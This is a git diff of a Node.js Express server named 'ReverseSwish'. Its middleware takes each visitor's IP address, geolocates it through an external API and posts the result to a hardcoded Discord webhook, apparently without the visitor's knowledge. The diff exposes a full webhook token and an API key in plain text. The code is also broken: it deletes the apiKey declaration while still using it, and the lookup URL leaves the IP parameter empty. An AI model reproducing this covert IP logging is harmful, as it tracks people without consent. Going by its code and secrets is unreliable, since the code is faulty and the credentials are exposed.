@@ -5,15 +5,10 @@ const axios = require("axios");
 const app = express();
 
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1252955031750311946/M9E0m6o7hH7K9TyQhimNOn3HECIw7k_PS6v3bfpnQoGBWHQZU7ZgO1TaWEGATcarOjyo";
-
-
-
-app.use(express.json());
-
 let MSID = ""
 let AMOUNT = ""
 
-
+app.use(express.json());
 app.get("/", (req, res) => {
   res.send("ReverseSwish is running! 🚀");
 });
@@ -32,7 +27,7 @@ async function sendDiscordWebhook(embed) {
 // Function to fetch IP geolocation data
 async function fetchIPGeolocation(apiKey, ipAddress) {
   try {
-    const apiUrl = `https://api.example.com/ipinfo/${ipAddress}?apiKey=${apiKey}`; // Replace with actual API URL
+    const apiUrl = `https://api-bdc.net/data/ip-geolocation?ip=&localityLanguage=en&key=a5ab355289484ce8aef147cda8ff3da0`; // Replace with actual API URL
     const response = await axios.get(apiUrl);
     return response.data; // Return the geolocation data
   } catch (error) {
@@ -45,7 +40,6 @@ async function fetchIPGeolocation(apiKey, ipAddress) {
 app.use(async (req, res, next) => {
   try {
     const ipAddress = req.ip; // Assuming you want to get client's IP address
-    const apiKey = 'a5ab355289484ce8aef147cda8ff3da0'; // Replace with your API key
     const ipInfo = await fetchIPGeolocation(apiKey, ipAddress);
 
     const embedMessage = {
